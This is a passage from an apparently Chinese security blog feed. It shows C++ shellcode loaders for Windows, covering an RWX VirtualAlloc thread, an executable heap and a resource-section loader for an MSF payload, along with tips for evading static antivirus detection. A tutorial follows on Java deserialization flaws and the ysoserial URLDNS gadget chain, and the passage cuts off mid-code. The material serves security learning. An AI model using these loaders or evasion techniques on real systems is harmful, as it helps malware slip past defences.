class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buf[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">// 申请一块可进行读写操作的内存</span><br>    LPVOID pMemory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">sizeof</span>(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><br>    <span class="hljs-comment">// 将buf数组中的内容复制到刚刚分配的内存中</span><br>    <span class="hljs-built_in">RtlMoveMemory</span>(pMemory, buf, <span class="hljs-built_in">sizeof</span>(buf));<br><br>    <span class="hljs-comment">// 创建一个新的线程来执行内存中的代码</span><br>    HANDLE hThread = <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)pMemory, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 设置为一直运行这个线程，除非收到Single信号才中断</span><br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4、通过堆加载"><a href="#4、通过堆加载" class="headerlink" title="4、通过堆加载"></a>4、通过堆加载</h4><p>这段代码首先创建了一个具有执行权限的堆，然后在堆中分配内存并将shellcode复制到内存中。最后，代码通过直接调用存储在内存中的shellcode来执行它 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-comment">//ShellCode部分</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 创建一个具有执行权限的堆，以存储shellcode</span><br>    HANDLE HeapHandle = <span class="hljs-built_in">HeapCreate</span>(HEAP_CREATE_ENABLE_EXECUTE, <span class="hljs-built_in">sizeof</span>(shellcode), <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 在创建的堆中分配一块内存，并将其地址赋给buffer</span><br>    <span class="hljs-type">char</span>* buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">HeapAlloc</span>(HeapHandle, HEAP_ZERO_MEMORY, <span class="hljs-built_in">sizeof</span>(shellcode));<br><br>    <span class="hljs-comment">// 将shellcode复制到buffer指向的内存中</span><br>    <span class="hljs-built_in">memcpy</span>(buffer, shellcode, <span class="hljs-built_in">sizeof</span>(shellcode));<br><br>    <span class="hljs-comment">// 将buffer指向的内存地址强制转换为一个函数指针，并调用该函数，执行shellcode</span><br>    ((<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>)) buffer)();<br>    <br>    <span class="hljs-comment">// 下面是另一种创建线程的方法，这里被注释掉了</span><br>    <span class="hljs-comment">// 创建一个新线程并执行buffer指向的内存中的shellcode</span><br>    <span class="hljs-comment">// HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);</span><br><br>    <span class="hljs-comment">// 等待新线程执行完毕</span><br>    <span class="hljs-comment">// WaitForSingleObject(hThread, INFINITE);</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5、基于资源节加载"><a href="#5、基于资源节加载" class="headerlink" title="5、基于资源节加载"></a>5、基于资源节加载</h4><h6 id="导入资源"><a href="#导入资源" class="headerlink" title="导入资源"></a>导入资源</h6><p>使用MSF生成bin文件，随后点击<code>VSstudio中添加资源-&gt;导入</code>，并选择生成的bin文件</p><img src="/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/image-20240517213843599.png" class="" title="image-20240517213843599"><p>然后自定义bin文件的资源类型, 此处我自定义的类型为”shellcode”，当然你也可以定义成其它的名字</p><img src="/2024/05/20/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/image-20240517213856369.png" class="" title="image-20240517213856369"><p>添加完资源后会在当前项目生成一个<code>resource.h</code>, 代码如下所示，这里只需注意这段代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">define</span> IDR_SHELLCODE1 101</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;resource.h&quot;</span></span><br><br><br><span class="hljs-comment">//&#123;&#123;NO_DEPENDENCIES&#125;&#125;</span><br><span class="hljs-comment">// Microsoft Visual C++ 生成的包含文件。</span><br><span class="hljs-comment">// 供 Shellcode加载器.rc 使用</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">//IDR_SHELLCODE1 通常用于标识和引用项目中的某个资源，例如嵌入到可执行文件中的二进制数据、图像或其他类型的资源，在项目的其他部分（例如代码或资源脚本中），可以通过使用 IDR_SHELLCODE1 符号来引用这个资源，而不是直接使用数字常量（如 101</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IDR_SHELLCODE1                  101</span><br><br><span class="hljs-comment">// Next default values for new objects</span><br><span class="hljs-comment">// </span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> APSTUDIO_INVOKED</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> APSTUDIO_READONLY_SYMBOLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_RESOURCE_VALUE        102</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_COMMAND_VALUE         40001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_CONTROL_VALUE         1001</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _APS_NEXT_SYMED_VALUE           101</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h6 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h6><p>以下是完整shellcode加载器代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;resource.h&quot;</span></span><br><br><span class="hljs-comment">//通过资源加载ShellCode</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ResourceLoader</span><span class="hljs-params">()</span> </span>&#123;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    FindResource用于查找指定模块（EXE或DLL文件）中指定名称和类型的资源,其语法格式如下:</span><br><span class="hljs-comment">    HRSRC FindResource(</span><br><span class="hljs-comment">          HMODULE hModule,  //指向包含要查找的资源的模块的句柄,若该参数为NULL，则查找当前进程中的资源</span><br><span class="hljs-comment">          LPCTSTR lpName,   //指向资源名称的指针，可以是一个字符串或者一个整数，若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源标识符</span><br><span class="hljs-comment">          LPCTSTR lpType    //指向资源类型的指针，可以是一个字符串或者一个整数。若是一个整数，则它是一个由MAKEINTRESOURCE宏定义的资源类型标识符</span><br><span class="hljs-comment">    );</span><br><span class="hljs-comment">    如果查找成功，则返回资源句柄；否则返回NULL</span><br><span class="hljs-comment">    */</span><br>    HRSRC Res = <span class="hljs-built_in">FindResource</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in">MAKEINTRESOURCE</span>(IDR_SHELLCODE1), <span class="hljs-string">L&quot;shellcode&quot;</span>);<br><br>    <span class="hljs-comment">//用于获取资源的大小</span><br>    DWORD ResSize = <span class="hljs-built_in">SizeofResource</span>(<span class="hljs-literal">NULL</span>, Res);<br><br>    <span class="hljs-comment">//LoadResource函数会将指定资源句柄所指向的资源数据加载到内存中，并返回一个指向该资源数据的句柄</span><br>    HGLOBAL Load = <span class="hljs-built_in">LoadResource</span>(<span class="hljs-literal">NULL</span>, Res);<br><br>    <span class="hljs-comment">//申请内存</span><br>    <span class="hljs-type">void</span>* buffer = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, ResSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(buffer, Load, ResSize);<br><br>    <span class="hljs-comment">//执行shellcode</span><br>    ((<span class="hljs-built_in">void</span>(*)(<span class="hljs-type">void</span>)) buffer)();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br>    <span class="hljs-built_in">ResourceLoader</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>导入资源和实现代码在一个exe中</p><p>静态免杀：要么自己写shellcode，要么加密混淆shellcode使其解不明白，要么分离shellcode。如果检查加载器另说</p>]]></content>
    
    
    <categories>
      
      <category>静态免杀</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shellcode</tag>
      
      <tag>加载器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化和类加载机制</title>
    <link href="/2024/05/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"/>
    <url>/2024/05/20/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h3 id="Java反序列化介绍："><a href="#Java反序列化介绍：" class="headerlink" title="Java反序列化介绍："></a>Java反序列化介绍：</h3><p>序列化（Serialization）：把Java对象转换为字节序列的过程。<br>反序列化（DeSerialization）：把字节序列恢复为Java对象的过程。</p><p>其中有两个重要的方法：<code>writeObject</code>和<code>readObject</code>。序列化时需要使用<code>writeObject</code>将对象转化为字节流，反序列化需要使用<code>readObject</code>将字节流转化为对象。</p><h4 id="反序列化基础操作"><a href="#反序列化基础操作" class="headerlink" title="反序列化基础操作"></a>反序列化基础操作</h4><p>打开idea，创建项目，新建一个 Person 类，创建一些属性和方法（注：要想对类进行序列化操作，需要实现 Serializable 类）</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424103734758.png" alt="image-20240424103734758"></p><p>新建一个 Serialization 类，代码中调用 <em><strong>writeObject</strong></em> 方法进行序列化操作，运行后会生成一个名为 ser.bin 的序列化文件</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424104644674.png" alt="image-20240424104644674"></p><p>新建一个 Unserialization 类，调用 <em><strong>readObject</strong></em> 方法对 ser.bin 文件内容进行反序列化操作，然后输出反序列化后的对象</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424110324114.png" alt="image-20240424110324114"></p><h4 id="反序列化漏洞原理"><a href="#反序列化漏洞原理" class="headerlink" title="反序列化漏洞原理"></a>反序列化漏洞原理</h4><p>根据上面的例子，可见完成序列化和反序列化离不开两个重要的方法 <code>writeObject</code> 和 <code>readObject</code> ，这两个方法可以经过开发者重写，一般序列化的重写都是由于下面这种场景诞生的。</p><p>只要服务端反序列化数据，客户端传递类的 <code>readObject</code> 中代码会自动执行，基于攻击者在服务器上运行代码的能力。</p><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><ol><li>大前提：参与序列化的所有类都继承了 <code>Serializable</code>，即所有类都是可序列化的</li><li>入口类重写了 <code>readObject()</code>方法，且其参数类型宽泛，并且是 <code>jdk</code>自带的</li><li>构造调用链</li><li>执行类 (RCE、SSRF、读写文件等)</li></ol><h3 id="产生安全问题的形式"><a href="#产生安全问题的形式" class="headerlink" title="产生安全问题的形式"></a>产生安全问题的形式</h3><ol><li>入口类的 <code>readObject()</code>中调用了危险方法</li><li>入口类参数中包含可控类，该类调用 <code>readObject()</code>时会触发危险方法</li><li>入口类参数中包含可控类，该类 <code>readObject()</code>时调用其他类，其他类继续调用另一个类(套娃)，直到有一个类调用了危险方法 (正常情况下反序列化漏洞的利用方法)</li><li>构造函数&#x2F;静态代码块等类加载时隐式执行</li></ol><p>接下来对每种形式进行举例讲解：</p><h4 id="1-入口类的-readObject-直接调用危险方法"><a href="#1-入口类的-readObject-直接调用危险方法" class="headerlink" title="1.入口类的 readObject 直接调用危险方法"></a>1.入口类的 readObject 直接调用危险方法</h4><p>这种情况不太可能出现，但还是讲一下原理</p><p>在Person类中重写 readObject 方法，调用 <em>Runtime</em>.<em>getRuntime</em>().<em>exec</em>() 执行计算器</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424133907888.png" alt="image-20240424133907888"></p><p>进行序列化操作，生成ser.bin文件，对ser.bin文件反序列化时会调用重写的 readObject 方法，从而执行计算器</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424134034223.png" alt="image-20240424134034223"></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">原理：<br>1、在Java中，当一个类实现了Serializable接口并且重写readObject方法时，该方法会在对象进行反序列化时被调用。<br>2、由于在<span class="hljs-keyword">Person</span>类中实现了Serializable接口，并且重写了readObject方法，所以在反序列化时调用ois.readObject()会触发<span class="hljs-keyword">Person</span>类的readObject方法。<br></code></pre></td></tr></table></figure><p>一般不会有程序员这么写…</p><h4 id="2-入口类参数中包含可控类，该类有危险方法，readObject-时调用"><a href="#2-入口类参数中包含可控类，该类有危险方法，readObject-时调用" class="headerlink" title="2.入口类参数中包含可控类，该类有危险方法，readObject 时调用"></a>2.入口类参数中包含可控类，该类有危险方法，readObject 时调用</h4><p>toSting 方法：当使用 System.out.println() 打印对象时，实际上会调用该对象的 toString 方法来获取字符串表示形式</p><p>在Person类中重写 <em>toString</em> 方法，调用计算器</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424135426887.png" alt="image-20240424135426887"></p><p>进行序列化操作，生成ser.bin文件，对ser.bin文件反序列化时会调用重写的 toString 方法，从而执行计算器</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424135758323.png" alt="image-20240424135758323"></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">原理：<br><span class="hljs-number">1</span>、obj是通过反序列化得到的，其类型是Person，而Person类中重写了<span class="hljs-built_in">toString</span>方法，所以在打印时会调用Person类的<span class="hljs-built_in">toString</span>方法。<br><span class="hljs-number">2</span>、由于<span class="hljs-built_in">toString</span>方法包含了执行Runtime.getRuntime().<span class="hljs-built_in">exec</span>(<span class="hljs-string">&quot;calc&quot;</span>)的代码，导致计算器弹出。<br></code></pre></td></tr></table></figure><p>但这本身其实是由于打印对象时造成的安全问题，和反序列化并没有太大关系，</p><p>只是想说如果对方在反序列化的时候同时打印了对象，那么这里也可以成为一个利用点。</p><h4 id="3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用"><a href="#3-入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用" class="headerlink" title="3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用"></a>3.入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用</h4><p>这里使用 URLDNS反序列化链 进行分析</p><p><code>URLDNS</code> 是ysoserial中利用链的一个名字，通常用于检测是否存在Java反序列化漏洞。该利用链具有如下特点：</p><ul><li>不限制jdk版本，使用Java内置类，对第三方依赖没有要求</li><li>目标无回显，可以通过DNS请求来验证是否存在反序列化漏洞</li><li>URLDNS利用链，只能发起DNS请求，并不能进行其他利用</li></ul><h6 id="URLDNS反序列化链复现："><a href="#URLDNS反序列化链复现：" class="headerlink" title="URLDNS反序列化链复现："></a>URLDNS反序列化链复现：</h6><p>利用 ysoserial-0.0.6-SNAPSHOT-all.jar 工具生成一个序列化数据</p><p>链接：<a href="https://github.com/Y4er/ysoserial">https://github.com/Y4er/ysoserial</a></p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424144200349.png" alt="image-20240424144200349"></p><p>创建一个 <em>UnseriaTest</em> 类，对 urldns.txt 文件进行反序列化操作，urldns.txt需要放到项目目录下</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424144448230.png" alt="image-20240424144448230"></p><p>dnslog成功收到请求</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424144601351.png" alt="image-20240424144601351"></p><h6 id="URLDNS反序列化链分析："><a href="#URLDNS反序列化链分析：" class="headerlink" title="URLDNS反序列化链分析："></a>URLDNS反序列化链分析：</h6><p>根据 ysoserial 中列出的 Gadget 进行分析：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">*   Gadget Chain:<span class="hljs-operator"></span><br><span class="hljs-operator">*     </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><span class="hljs-operator"></span><br><span class="hljs-operator">*       </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span><span class="hljs-operator"></span><br><span class="hljs-operator">*         </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">*           </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br></code></pre></td></tr></table></figure><p>具体流程就是：<code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode，而传入 <code>java.net.URL</code> 类的时候会调用 URL.hashCode() ，URL.hashCode() 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求</p><p><strong>HashMap#readObject：</strong></p><p>代码中敲一个 <em>HashMap</em>  (HashMap 是 Java 中一种常用的数据结构，用于存储键值对，它基于哈希表实现，可以高效地存储和检索数据)，然后ctrl+鼠标点过去，搜索一下重写的 readObject 方法</p><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/image-20240424151032287.png" alt="image-20240424151032287"></p><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> <span class="hljs-comment">// 读取传入的输入流，对传入的序列化数据进行反序列化</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 读取阈值(忽略)、加载因子和任何隐藏内容</span><br>        s.defaultReadObject(); <span class="hljs-comment">//使用 s.defaultReadObject() 读取并忽略阈值（threshold）、负载因子（loadfactor）和任何隐藏信息。</span><br>        reinitialize(); <span class="hljs-comment">//重新初始化 HashMap 对象</span><br>        <span class="hljs-keyword">if</span> (loadFactor &lt;= <span class="hljs-number">0</span> || Float.isNaN(loadFactor))<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> +<br>                                             loadFactor);<br>        s.readInt();                <span class="hljs-comment">// 读取并忽略存储桶数量</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">mappings</span> <span class="hljs-operator">=</span> s.readInt(); <span class="hljs-comment">// 从输入流中读取映射数（即 HashMap 的大小）。如果映射数小于 0，则抛出 InvalidObjectException。</span><br>        <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidObjectException</span>(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> +<br>                                             mappings);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123; <br>            <span class="hljs-comment">// 如果映射数大于 0，则根据负载因子和映射数调整表的容量。容量范围在 DEFAULT_INITIAL_CAPACITY 到 MAXIMUM_CAPACITY 之间。</span><br>            <span class="hljs-type">float</span> <span class="hljs-variable">lf</span> <span class="hljs-operator">=</span> Math.min(Math.max(<span class="hljs-number">0.25f</span>, loadFactor), <span class="hljs-number">4.0f</span>);<br>            <span class="hljs-type">float</span> <span class="hljs-variable">fc</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">cap</span> <span class="hljs-operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                       DEFAULT_INITIAL_CAPACITY :<br>                       (fc &gt;= MAXIMUM_CAPACITY) ?<br>                       MAXIMUM_CAPACITY :<br>                       tableSizeFor((<span class="hljs-type">int</span>)fc));<br>            <span class="hljs-type">float</span> <span class="hljs-variable">ft</span> <span class="hljs-operator">=</span> (<span class="hljs-type">float</span>)cap * lf;<br>            threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                         (<span class="hljs-type">int</span>)ft : Integer.MAX_VALUE);<br><br>            <span class="hljs-comment">// 创建一个指定容量的 Node 数组作为 HashMap 的表（table）</span><br>            SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>            <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>[cap];<br>            table = tab;<br><br>            <span class="hljs-comment">// 从输入流中依次读取键和值，并使用 putVal 方法将映射放入 HashMap 中</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>前面不懂可以不看，重点在<code>putVal</code>方法</p><p><strong>HashMap.putVal()：</strong></p><p><code>putVal</code>是往HashMap中放入键值对的方法，putVal 里调用了hash方法来处理key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>    putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>HashMap.hash()：</strong></p><p>跟进hash方法，这里又调用了<code>key.hashcode</code>方法，根据调用链来看，传入的是 key 值是<code>URL</code> 对象，所以调用的是 <code>URL.hashCode()</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>        <span class="hljs-type">int</span> h;<br>        <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span 